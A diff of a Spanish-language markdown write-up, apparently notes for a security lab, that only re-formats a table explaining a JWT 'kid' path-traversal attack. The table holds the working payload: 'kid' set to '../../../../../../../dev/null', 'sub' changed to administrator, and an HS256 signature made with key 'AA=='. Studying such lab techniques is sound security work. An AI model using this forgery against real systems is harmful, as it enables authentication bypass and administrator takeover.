@@ -19,11 +19,11 @@ El server usa `kid` como **ruta de archivo** para cargar la clave. Con **path tr
 
 Las 3 partes decodificadas. <mark style="background:#a5d6a7;color:#111">🎯 objetivo</mark> = lo que querés · <mark style="background:#ffcc80;color:#111">⚙️ consecuencia</mark> = lo que cambia para que valide.
 
-| Parte | Original | Modificado |
-| --- | --- | --- |
-| **header** | { "kid": "<uuid del server>", "alg": "HS256" } | { "kid": <mark style="background:#ffcc80;color:#111">"../../../../../../../dev/null"</mark>, "alg": "HS256" } |
-| **payload** | { "sub": "wiener" } | { "sub": <mark style="background:#a5d6a7;color:#111">"administrator"</mark> } |
-| **signature** | HMAC (clave que el server carga por `kid`) | <mark style="background:#ffcc80;color:#111">HMAC con k=AA==</mark> (Base64 de un null byte = /dev/null) |
+| Parte         | Original                                       | Modificado                                                                                                    |
+| ------------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
+| **header**    | { "kid": "<uuid del server>", "alg": "HS256" } | { "kid": <mark style="background:#ffcc80;color:#111">"../../../../../../../dev/null"</mark>, "alg": "HS256" } |
+| **payload**   | { "sub": "wiener" }                            | { "sub": <mark style="background:#a5d6a7;color:#111">"administrator"</mark> }                                 |
+| **signature** | HMAC (clave que el server carga por `kid`)     | <mark style="background:#ffcc80;color:#111">HMAC con k=AA==</mark> (Base64 de un null byte = /dev/null)       |
 
 > **🎯 Objetivo:** `sub → administrator`. **⚙️ Consecuencia:** `kid → /dev/null` y firmar HS256 con `k=AA==` (clave conocida = null byte).
 
